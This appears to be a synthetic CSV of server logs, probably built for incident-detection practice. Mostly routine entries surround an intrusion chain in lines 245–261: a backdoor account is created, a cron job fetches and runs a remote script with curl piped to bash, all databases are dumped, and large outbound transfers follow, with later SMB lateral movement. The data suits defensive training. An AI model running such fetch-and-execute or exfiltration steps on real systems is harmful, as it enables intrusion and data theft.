line_id,timestamp,host,source,message
245,2026-03-11 02:31:27,vpn01,sshd,Accepted password for deploy from 185.243.115.94 port 51884 ssh2
246,2026-03-11 02:31:29,vpn01,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
247,2026-03-11 02:34:29,vpn01,sudo,deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc_update
248,2026-03-11 02:34:40,vpn01,useradd,"new user: name=svc_update, UID=1041, GID=1041, home=/home/svc_update, shell=/bin/bash"
249,2026-03-11 02:35:00,vpn01,sshd,Accepted publickey for svc_update from 10.20.3.55 port 44210 ssh2
250,2026-03-11 02:35:35,vpn01,cron,(svc_update) CMD (curl -s http://45.147.230.61/u.sh | bash)
251,2026-03-11 02:59:04,web01,systemd,logrotate.service: Succeeded.
252,2026-03-11 03:02:00,db01,sshd,Accepted password for svc_update from 10.20.3.55 port 39914 ssh2
253,2026-03-11 03:02:18,db01,sudo,svc_update : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/mysqldump --all-databases
254,2026-03-11 03:03:00,db01,systemd,Started Session 8842 of user svc_update.
255,2026-03-11 03:05:41,web01,systemd,logrotate.service: Succeeded.
256,2026-03-11 03:07:00,fw01,firewall,ALLOW tcp 10.20.1.21:54574 -> 45.147.230.61:443 bytes=72846463
257,2026-03-11 03:07:47,fw01,firewall,ALLOW tcp 10.20.1.21:49831 -> 45.147.230.61:443 bytes=54086409
258,2026-03-11 03:08:31,fw01,firewall,ALLOW tcp 10.20.1.21:40201 -> 45.147.230.61:443 bytes=94146328
259,2026-03-11 03:09:09,db01,cron,(monitor) CMD (/usr/local/bin/healthcheck --quiet)
260,2026-03-11 03:09:09,fw01,firewall,ALLOW tcp 10.20.1.21:55125 -> 45.147.230.61:443 bytes=93618719
261,2026-03-11 03:41:43,fw01,firewall,ALLOW tcp 10.20.3.55:44679 -> 10.20.2.40:445 bytes=27824316
262,2026-03-11 03:45:34,vpn01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
263,2026-03-11 04:11:16,app02,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
264,2026-03-11 06:23:41,fs01,sshd,Accepted publickey for monitor from 10.20.9.72 port 43591 ssh2
265,2026-03-11 06:26:11,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
266,2026-03-11 06:30:06,web01,nginx,"203.0.113.7 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
267,2026-03-11 06:55:36,db01,cron,(rpatel) CMD (/usr/local/bin/report.sh --daily)
268,2026-03-11 06:56:04,fw01,firewall,ALLOW tcp 10.20.9.61:45644 -> 10.20.2.40:443 bytes=25549
269,2026-03-11 07:02:00,app02,systemd,Started Session 7060 of user achen.
270,2026-03-11 07:11:51,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
271,2026-03-11 07:27:58,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=39 HTTP/1.1"" 200 1968"
272,2026-03-11 07:40:59,vpn01,sshd,Accepted publickey for monitor from 10.20.9.48 port 45793 ssh2
273,2026-03-11 07:45:05,web02,sshd,Accepted publickey for achen from 10.20.9.14 port 56462 ssh2
274,2026-03-11 07:52:16,web02,sshd,Accepted publickey for rpatel from 10.20.9.33 port 53494 ssh2
275,2026-03-11 08:09:22,app02,sshd,pam_unix(sshd:session): session opened for user achen by (uid=0)
276,2026-03-11 08:18:21,fs01,sudo,backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
277,2026-03-11 08:37:13,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 204"
278,2026-03-11 08:47:37,web02,sudo,monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
279,2026-03-11 08:50:14,fw01,firewall,ALLOW tcp 10.20.9.14:42306 -> 10.20.1.11:443 bytes=20723
280,2026-03-11 08:59:26,web01,sudo,jmorales : TTY=pts/0 ; PWD=/home/jmorales ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
281,2026-03-11 09:27:09,fw01,firewall,ALLOW tcp 10.20.9.61:54702 -> 10.20.2.21:443 bytes=37510
282,2026-03-11 09:30:17,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 899"
283,2026-03-11 09:53:16,fw01,firewall,DENY tcp 203.0.113.7:43070 -> 10.20.1.11:23 bytes=0
284,2026-03-11 10:07:31,app02,sshd,Failed password for tokafor from 10.20.9.72 port 53533 ssh2
285,2026-03-11 10:09:30,vpn01,sudo,deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
286,2026-03-11 10:16:27,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=14 HTTP/1.1"" 200 5346"
287,2026-03-11 10:17:27,web02,cron,(jmorales) CMD (/usr/local/bin/report.sh --daily)
288,2026-03-11 10:24:43,app01,cron,(backup) CMD (/usr/local/bin/report.sh --daily)
289,2026-03-11 10:29:31,app02,systemd,Started Session 8246 of user monitor.
290,2026-03-11 10:32:16,web01,sshd,Accepted publickey for achen from 10.20.9.14 port 41736 ssh2
291,2026-03-11 10:50:22,web01,sudo,deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
292,2026-03-11 10:51:32,app02,cron,(backup) CMD (/usr/local/bin/report.sh --daily)
293,2026-03-11 10:52:03,vpn01,cron,(achen) CMD (/usr/local/bin/report.sh --daily)
294,2026-03-11 11:07:10,fs01,cron,(deploy) CMD (/usr/local/bin/report.sh --daily)
295,2026-03-11 11:10:01,fw01,firewall,DENY tcp 203.0.113.19:50778 -> 10.20.1.11:23 bytes=0
296,2026-03-11 11:19:58,app01,sudo,tokafor : TTY=pts/0 ; PWD=/home/tokafor ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
297,2026-03-11 11:20:15,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=2 HTTP/1.1"" 200 8423"
298,2026-03-11 11:22:21,app01,sshd,Accepted publickey for rpatel from 10.20.9.27 port 46155 ssh2
299,2026-03-11 11:24:13,db01,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
300,2026-03-11 11:24:53,web01,nginx,"198.51.100.42 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
301,2026-03-11 11:26:41,app02,sshd,Accepted publickey for swilliams from 10.20.9.72 port 57502 ssh2
302,2026-03-11 11:47:35,db01,sshd,Accepted publickey for rpatel from 10.20.9.27 port 43864 ssh2
303,2026-03-11 11:48:14,fw01,firewall,DENY tcp 198.51.100.42:58721 -> 10.20.1.11:23 bytes=0
304,2026-03-11 12:05:48,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=7 HTTP/1.1"" 200 1470"
305,2026-03-11 12:11:18,db01,sshd,pam_unix(sshd:session): session opened for user monitor by (uid=0)
306,2026-03-11 12:12:06,app01,sshd,Accepted publickey for jmorales from 10.20.9.27 port 53030 ssh2
307,2026-03-11 12:15:07,app01,sshd,Accepted publickey for backup from 10.20.9.27 port 53110 ssh2
308,2026-03-11 12:15:45,fw01,firewall,ALLOW tcp 10.20.9.27:47707 -> 10.20.2.21:443 bytes=38220
309,2026-03-11 12:23:19,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
310,2026-03-11 12:31:23,app02,cron,(rpatel) CMD (/usr/local/bin/report.sh --daily)
311,2026-03-11 12:41:14,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 523"
312,2026-03-11 12:48:37,fw01,firewall,DENY tcp 203.0.113.19:55458 -> 10.20.1.11:23 bytes=0
313,2026-03-11 12:49:02,web01,sudo,tokafor : TTY=pts/0 ; PWD=/home/tokafor ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
314,2026-03-11 12:51:46,app01,sshd,Accepted publickey for backup from 10.20.9.72 port 56462 ssh2
315,2026-03-11 12:55:23,fw01,firewall,DENY tcp 198.51.100.42:49089 -> 10.20.1.11:23 bytes=0
316,2026-03-11 12:59:17,web02,sshd,Accepted publickey for jmorales from 10.20.9.48 port 48021 ssh2
317,2026-03-11 13:26:17,db01,sshd,Accepted publickey for tokafor from 10.20.9.96 port 45612 ssh2
318,2026-03-11 13:45:35,fs01,sshd,pam_unix(sshd:session): session opened for user swilliams by (uid=0)
319,2026-03-11 13:53:06,web01,sshd,pam_unix(sshd:session): session opened for user rpatel by (uid=0)
320,2026-03-11 13:56:05,fw01,firewall,ALLOW tcp 10.20.9.27:56026 -> 10.20.1.21:443 bytes=48974
321,2026-03-11 14:04:28,app02,systemd,Started Session 2594 of user rpatel.
322,2026-03-11 14:15:19,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=19 HTTP/1.1"" 200 3335"
323,2026-03-11 14:21:24,db01,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
324,2026-03-11 14:23:24,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=3 HTTP/1.1"" 200 2413"
325,2026-03-11 14:44:33,fw01,firewall,ALLOW tcp 10.20.9.48:40531 -> 10.20.2.21:443 bytes=27464
326,2026-03-11 14:47:14,fw01,firewall,DENY tcp 203.0.113.19:42236 -> 10.20.1.11:23 bytes=0
327,2026-03-11 15:37:03,fw01,firewall,ALLOW tcp 10.20.9.27:44212 -> 10.20.3.55:443 bytes=46341
328,2026-03-11 15:44:15,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 563"
329,2026-03-11 15:52:55,db01,systemd,Started Session 2241 of user jmorales.
330,2026-03-11 16:02:20,vpn01,systemd,Started Session 1890 of user achen.
331,2026-03-11 16:05:45,web01,sshd,Accepted publickey for swilliams from 10.20.9.61 port 48146 ssh2
332,2026-03-11 16:06:23,fw01,firewall,ALLOW tcp 10.20.9.27:53013 -> 10.20.1.12:443 bytes=21851
333,2026-03-11 16:39:18,web01,sshd,Failed password for deploy from 10.20.9.27 port 43248 ssh2
334,2026-03-11 16:45:21,fw01,firewall,ALLOW tcp 10.20.9.96:56424 -> 10.20.1.21:443 bytes=46951
335,2026-03-11 16:49:34,web02,cron,(tokafor) CMD (/usr/local/bin/report.sh --daily)
336,2026-03-11 17:02:12,app01,systemd,Started Session 9064 of user jmorales.
337,2026-03-11 17:18:52,fw01,firewall,DENY tcp 198.51.100.42:47096 -> 10.20.1.11:23 bytes=0
338,2026-03-11 17:33:45,vpn01,sshd,pam_unix(sshd:session): session opened for user tokafor by (uid=0)
339,2026-03-11 17:38:46,fw01,firewall,DENY tcp 198.51.100.42:49521 -> 10.20.1.11:23 bytes=0
340,2026-03-11 17:56:51,fs01,sshd,pam_unix(sshd:session): session opened for user backup by (uid=0)
341,2026-03-11 18:03:21,web01,sshd,pam_unix(sshd:session): session opened for user tokafor by (uid=0)
342,2026-03-11 18:10:19,web02,sudo,jmorales : TTY=pts/0 ; PWD=/home/jmorales ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
343,2026-03-11 18:34:10,web01,sshd,Accepted publickey for rpatel from 10.20.9.48 port 55950 ssh2
344,2026-03-11 18:49:44,vpn01,cron,(achen) CMD (/usr/local/bin/report.sh --daily)
345,2026-03-11 18:56:28,web01,sshd,pam_unix(sshd:session): session opened for user swilliams by (uid=0)
346,2026-03-11 19:01:22,fw01,firewall,DENY tcp 198.51.100.42:52162 -> 10.20.1.11:23 bytes=0
347,2026-03-11 19:19:25,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 525"
348,2026-03-11 19:40:20,fs01,sshd,Accepted publickey for rpatel from 10.20.9.14 port 55889 ssh2
349,2026-03-11 19:44:20,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=12 HTTP/1.1"" 200 2122"
350,2026-03-11 19:44:44,app02,systemd,Started Session 6939 of user tokafor.
351,2026-03-11 19:53:37,app01,sshd,Failed password for rpatel from 10.20.9.61 port 51427 ssh2
352,2026-03-11 19:54:44,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=38 HTTP/1.1"" 200 5575"
353,2026-03-11 20:01:44,fw01,firewall,ALLOW tcp 10.20.9.14:49612 -> 10.20.1.12:443 bytes=32058
354,2026-03-11 20:06:47,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=16 HTTP/1.1"" 200 4405"
355,2026-03-11 20:11:28,app02,cron,(swilliams) CMD (/usr/local/bin/report.sh --daily)
356,2026-03-11 20:35:04,fs01,sshd,Accepted publickey for rpatel from 10.20.9.27 port 51057 ssh2
357,2026-03-11 20:36:21,app02,systemd,Started Session 3952 of user deploy.
358,2026-03-11 20:55:10,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 861"
359,2026-03-12 00:11:32,web01,cron,(monitor) CMD (/usr/local/bin/healthcheck --quiet)
360,2026-03-12 00:35:18,app01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
361,2026-03-12 00:36:03,db01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
362,2026-03-12 00:51:17,web02,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
363,2026-03-12 00:57:56,web01,cron,(monitor) CMD (/usr/local/bin/healthcheck --quiet)
364,2026-03-12 01:59:39,db01,cron,(monitor) CMD (/usr/local/bin/healthcheck --quiet)
365,2026-03-12 02:11:28,web02,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
366,2026-03-12 02:38:02,db01,cron,(monitor) CMD (/usr/local/bin/healthcheck --quiet)
367,2026-03-12 05:03:46,fw01,firewall,ALLOW tcp 10.20.3.55:55526 -> 10.20.2.40:445 bytes=29609075
368,2026-03-12 06:12:32,app02,systemd,Started Session 1363 of user monitor.
369,2026-03-12 06:43:48,fs01,systemd,Started Session 4199 of user swilliams.
370,2026-03-12 07:15:16,web01,systemd,Started Session 9368 of user tokafor.
371,2026-03-12 07:28:13,db01,cron,(monitor) CMD (/usr/local/bin/report.sh --daily)
372,2026-03-12 07:34:46,web02,cron,(monitor) CMD (/usr/local/bin/report.sh --daily)
373,2026-03-12 07:42:00,app02,cron,(swilliams) CMD (/usr/local/bin/report.sh --daily)
374,2026-03-12 07:45:58,web01,cron,(achen) CMD (/usr/local/bin/report.sh --daily)
375,2026-03-12 08:02:34,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=6 HTTP/1.1"" 200 5508"
376,2026-03-12 08:11:24,app02,sshd,pam_unix(sshd:session): session opened for user achen by (uid=0)
377,2026-03-12 08:18:11,web02,sshd,Accepted publickey for jmorales from 10.20.9.48 port 54019 ssh2
378,2026-03-12 08:24:39,fw01,firewall,DENY tcp 198.51.100.42:54596 -> 10.20.1.11:23 bytes=0
379,2026-03-12 08:29:20,app02,sshd,Accepted publickey for monitor from 10.20.9.27 port 48099 ssh2
380,2026-03-12 08:31:59,fw01,firewall,ALLOW tcp 10.20.9.72:52419 -> 10.20.3.55:443 bytes=15817
381,2026-03-12 08:34:21,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=8 HTTP/1.1"" 200 4961"
382,2026-03-12 08:40:09,app02,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
383,2026-03-12 08:43:32,fw01,firewall,DENY tcp 203.0.113.19:55856 -> 10.20.1.11:23 bytes=0
384,2026-03-12 08:47:04,vpn01,systemd,Started Session 2066 of user backup.
385,2026-03-12 08:47:38,fw01,firewall,ALLOW tcp 10.20.9.48:58347 -> 10.20.1.12:443 bytes=31483
386,2026-03-12 08:52:43,web01,nginx,"198.51.100.42 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
387,2026-03-12 08:56:06,vpn01,cron,(jmorales) CMD (/usr/local/bin/report.sh --daily)
388,2026-03-12 09:00:25,db01,cron,(rpatel) CMD (/usr/local/bin/report.sh --daily)
389,2026-03-12 09:10:13,web02,sshd,Accepted publickey for backup from 10.20.9.96 port 55311 ssh2
390,2026-03-12 09:24:50,web02,sudo,jmorales : TTY=pts/0 ; PWD=/home/jmorales ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
391,2026-03-12 09:28:20,app01,sshd,pam_unix(sshd:session): session opened for user monitor by (uid=0)
392,2026-03-12 09:29:12,app02,sshd,Accepted publickey for tokafor from 10.20.9.88 port 58725 ssh2
393,2026-03-12 09:33:02,fs01,sshd,Accepted publickey for jmorales from 10.20.9.27 port 43902 ssh2
394,2026-03-12 09:33:38,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=15 HTTP/1.1"" 200 1847"
395,2026-03-12 09:40:00,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=9 HTTP/1.1"" 200 2505"
396,2026-03-12 09:42:32,fw01,firewall,DENY tcp 203.0.113.7:58717 -> 10.20.1.11:23 bytes=0
397,2026-03-12 09:43:38,db01,sshd,Accepted publickey for monitor from 10.20.9.14 port 49380 ssh2
398,2026-03-12 09:44:44,fs01,sshd,pam_unix(sshd:session): session opened for user tokafor by (uid=0)
399,2026-03-12 09:48:24,fs01,sshd,Accepted publickey for tokafor from 10.20.9.72 port 59814 ssh2
400,2026-03-12 09:54:32,vpn01,sshd,pam_unix(sshd:session): session opened for user tokafor by (uid=0)
401,2026-03-12 10:39:56,vpn01,sshd,Accepted publickey for swilliams from 10.20.9.27 port 58357 ssh2
402,2026-03-12 10:40:09,fw01,firewall,ALLOW tcp 10.20.9.27:50729 -> 10.20.1.12:443 bytes=13554
403,2026-03-12 10:43:52,fs01,sshd,Accepted publickey for tokafor from 10.20.9.61 port 49273 ssh2
404,2026-03-12 10:51:22,app02,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
405,2026-03-12 10:52:52,vpn01,sudo,tokafor : TTY=pts/0 ; PWD=/home/tokafor ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
406,2026-03-12 11:07:42,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
407,2026-03-12 11:16:21,web01,sudo,jmorales : TTY=pts/0 ; PWD=/home/jmorales ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
408,2026-03-12 11:19:46,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=8 HTTP/1.1"" 200 6156"
409,2026-03-12 11:30:02,vpn01,cron,(tokafor) CMD (/usr/local/bin/report.sh --daily)
410,2026-03-12 11:47:28,app01,sshd,Accepted publickey for rpatel from 10.20.9.27 port 46166 ssh2
411,2026-03-12 11:49:47,fw01,firewall,DENY tcp 198.51.100.42:45790 -> 10.20.1.11:23 bytes=0
412,2026-03-12 11:49:51,vpn01,sshd,Accepted publickey for swilliams from 10.20.9.48 port 58902 ssh2
413,2026-03-12 12:03:50,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 357"
414,2026-03-12 12:07:07,fw01,firewall,ALLOW tcp 10.20.9.14:45687 -> 10.20.1.12:443 bytes=35892
415,2026-03-12 12:07:59,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=23 HTTP/1.1"" 200 7833"
416,2026-03-12 12:27:34,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=28 HTTP/1.1"" 200 2646"
417,2026-03-12 12:28:44,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 888"
418,2026-03-12 12:41:34,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 633"
419,2026-03-12 12:46:47,web02,sshd,pam_unix(sshd:session): session opened for user swilliams by (uid=0)
420,2026-03-12 12:49:16,web02,sudo,achen : TTY=pts/0 ; PWD=/home/achen ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
421,2026-03-12 12:59:03,app01,systemd,Started Session 2704 of user rpatel.
422,2026-03-12 13:14:46,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
423,2026-03-12 13:17:11,fs01,sshd,Accepted publickey for backup from 10.20.9.88 port 42549 ssh2
424,2026-03-12 13:28:55,app01,sshd,Accepted publickey for backup from 10.20.9.61 port 44810 ssh2
425,2026-03-12 13:31:31,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=4 HTTP/1.1"" 200 4787"
426,2026-03-12 13:53:16,app02,sshd,Accepted publickey for deploy from 10.20.9.88 port 54392 ssh2
427,2026-03-12 13:53:46,fw01,firewall,ALLOW tcp 10.20.9.33:44707 -> 10.20.2.21:443 bytes=31105
428,2026-03-12 14:44:20,web01,sshd,Accepted publickey for rpatel from 10.20.9.72 port 42267 ssh2
429,2026-03-12 15:05:02,fs01,sshd,Accepted publickey for achen from 10.20.9.33 port 59514 ssh2
430,2026-03-12 15:07:55,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=36 HTTP/1.1"" 200 2567"
431,2026-03-12 15:26:53,fw01,firewall,DENY tcp 203.0.113.19:55204 -> 10.20.1.11:23 bytes=0
432,2026-03-12 15:37:56,fs01,sshd,Failed password for tokafor from 10.20.9.61 port 45925 ssh2
433,2026-03-12 15:39:28,web02,systemd,Started Session 4710 of user jmorales.
434,2026-03-12 15:44:46,app02,cron,(backup) CMD (/usr/local/bin/report.sh --daily)
435,2026-03-12 15:52:05,fw01,firewall,ALLOW tcp 10.20.9.48:52201 -> 10.20.1.12:443 bytes=49038
436,2026-03-12 16:15:31,app01,sshd,Accepted publickey for deploy from 10.20.9.48 port 59212 ssh2
437,2026-03-12 16:19:33,app02,cron,(jmorales) CMD (/usr/local/bin/report.sh --daily)
438,2026-03-12 16:32:49,db01,systemd,Started Session 9489 of user deploy.
439,2026-03-12 16:54:33,app01,sshd,Accepted publickey for backup from 10.20.9.27 port 57042 ssh2
440,2026-03-12 17:09:22,web02,sshd,Accepted publickey for achen from 10.20.9.61 port 48200 ssh2
441,2026-03-12 17:13:53,app02,sshd,pam_unix(sshd:session): session opened for user jmorales by (uid=0)
442,2026-03-12 17:36:46,vpn01,sudo,deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
443,2026-03-12 17:50:54,web01,sshd,Accepted publickey for jmorales from 10.20.9.88 port 58738 ssh2
444,2026-03-12 18:13:23,app02,systemd,Started Session 1365 of user deploy.
445,2026-03-12 18:14:50,app02,sshd,pam_unix(sshd:session): session opened for user jmorales by (uid=0)
446,2026-03-12 18:23:06,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=2 HTTP/1.1"" 200 8472"
447,2026-03-12 18:25:14,app01,sshd,pam_unix(sshd:session): session opened for user monitor by (uid=0)
448,2026-03-12 18:46:37,app02,sshd,Failed password for backup from 10.20.9.88 port 53437 ssh2
449,2026-03-12 18:51:37,fw01,firewall,DENY tcp 203.0.113.19:42243 -> 10.20.1.11:23 bytes=0
450,2026-03-12 18:58:15,fw01,firewall,DENY tcp 198.51.100.42:59984 -> 10.20.1.11:23 bytes=0
451,2026-03-12 19:03:21,vpn01,sshd,pam_unix(sshd:session): session opened for user tokafor by (uid=0)
452,2026-03-12 19:09:18,vpn01,sudo,rpatel : TTY=pts/0 ; PWD=/home/rpatel ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
453,2026-03-12 19:10:42,fs01,sshd,Accepted publickey for deploy from 10.20.9.14 port 51776 ssh2
454,2026-03-12 19:21:29,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 530"
455,2026-03-12 19:31:43,vpn01,sshd,Accepted publickey for achen from 10.20.9.48 port 46767 ssh2
456,2026-03-12 19:32:18,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=5 HTTP/1.1"" 200 7202"
457,2026-03-12 19:34:22,app01,sshd,Accepted publickey for deploy from 10.20.9.61 port 49635 ssh2
458,2026-03-12 19:53:38,web01,cron,(swilliams) CMD (/usr/local/bin/report.sh --daily)
459,2026-03-12 19:57:42,app01,cron,(backup) CMD (/usr/local/bin/report.sh --daily)
460,2026-03-12 20:04:57,fw01,firewall,ALLOW tcp 10.20.9.96:51885 -> 10.20.3.55:443 bytes=48183
461,2026-03-12 20:26:42,app02,cron,(swilliams) CMD (/usr/local/bin/report.sh --daily)
462,2026-03-12 20:48:09,app01,sshd,Accepted publickey for rpatel from 10.20.9.33 port 50587 ssh2
463,2026-03-13 00:14:33,web02,cron,(monitor) CMD (/usr/local/bin/healthcheck --quiet)
464,2026-03-13 00:30:37,vpn01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
465,2026-03-13 00:34:17,app02,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
466,2026-03-13 00:52:44,app01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
467,2026-03-13 03:09:34,vpn01,systemd,logrotate.service: Succeeded.
468,2026-03-13 03:45:23,app02,sshd,Accepted publickey for backup from 10.20.2.40 port 41881 ssh2
469,2026-03-13 03:59:28,db01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
470,2026-03-13 04:29:49,web02,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
471,2026-03-13 05:04:56,db01,sshd,Accepted publickey for deploy from 10.20.2.21 port 42884 ssh2
472,2026-03-13 06:09:46,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=33 HTTP/1.1"" 200 8713"
473,2026-03-13 06:19:26,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 565"
474,2026-03-13 07:00:32,fw01,firewall,DENY tcp 198.51.100.42:43000 -> 10.20.1.11:23 bytes=0
475,2026-03-13 07:01:07,fw01,firewall,ALLOW tcp 10.20.9.14:55488 -> 10.20.3.55:443 bytes=3788
476,2026-03-13 07:05:11,web01,sshd,Accepted publickey for jmorales from 10.20.9.96 port 41753 ssh2
477,2026-03-13 07:16:39,db01,sshd,Accepted publickey for deploy from 10.20.9.72 port 55984 ssh2
478,2026-03-13 07:28:07,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 821"
479,2026-03-13 07:37:43,fs01,cron,(monitor) CMD (/usr/local/bin/report.sh --daily)
480,2026-03-13 07:45:26,app02,sudo,jmorales : TTY=pts/0 ; PWD=/home/jmorales ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
481,2026-03-13 07:55:29,web01,systemd,Started Session 1326 of user swilliams.
482,2026-03-13 08:00:04,fw01,firewall,ALLOW tcp 10.20.9.33:40062 -> 10.20.2.22:443 bytes=25030
483,2026-03-13 08:11:41,app02,sshd,Accepted publickey for rpatel from 10.20.9.48 port 42795 ssh2
484,2026-03-13 08:24:04,fw01,firewall,ALLOW tcp 10.20.9.96:48719 -> 10.20.1.12:443 bytes=11664
485,2026-03-13 08:50:31,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=38 HTTP/1.1"" 200 1869"
486,2026-03-13 08:58:17,app02,sshd,Accepted publickey for achen from 10.20.9.14 port 54519 ssh2
487,2026-03-13 09:14:54,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=15 HTTP/1.1"" 200 8990"
488,2026-03-13 09:17:45,app01,systemd,Started Session 5537 of user monitor.
489,2026-03-13 09:18:45,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 406"
490,2026-03-13 09:19:26,web01,nginx,"198.51.100.42 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
491,2026-03-13 09:20:27,vpn01,sudo,deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
